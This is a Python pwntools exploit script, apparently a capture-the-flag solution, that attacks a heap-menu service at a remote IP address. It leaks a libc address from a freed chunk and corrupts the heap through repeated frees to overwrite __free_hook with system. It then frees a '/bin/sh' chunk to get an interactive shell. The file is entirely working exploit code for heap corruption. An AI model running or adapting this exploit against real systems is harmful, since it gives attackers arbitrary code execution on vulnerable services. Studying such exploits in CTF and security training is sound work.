import os
from pwn import *
import changeld
def cmd(c):
    p.sendlineafter("e:",str(c))
def add(size=0x88,name="W",call=p64(0x10086)):
    cmd(1)
    p.sendlineafter("name",str(size))
    p.sendafter("name:",name)
    p.sendlineafter("call:",call)
def show(idx):
    cmd(2)
    p.sendlineafter("index:",str(idx))
def free(idx):
    cmd(4)
    p.sendlineafter("index:\n",str(idx))
#elf = changeld.change_ld('./chall', './ld-2.29.so')
#p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
#p=process("./chall",env={'LD_PERLOAD':'./libc.so.6'})

p=remote("34.92.96.238",10001)
for x in range(8):
	add(0x88)#0
for x in range(8):
	free(7-x)
add(0x18)
show(8)
p.readuntil("name:\n")
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7fb0a57-0x7ffff7dce000)-(0x7ffff7dd0200-0x7ffff7dce000
)-(0x00007ffff7a1f000-0x7ffff7bec000)-(0x7ffff7db9000-0x7ffff7a1f000)
log.warning(hex(base))
for x in range(9):
	add(0x68)#9-17
for x in range(8):
	free(9+x)
free(17)
free(16)

for x in range(7):
	add(0x68,'/bin/sh\00')
__free_hook=0x3b38c8+base
add(0x68,p64(__free_hook))
add(0x68)
add(0x68)
context.log_level='debug'
sys=0x41c30+base
#gdb.attach(p)
add(0x68,p64(sys))
free(20)
p.interactive()
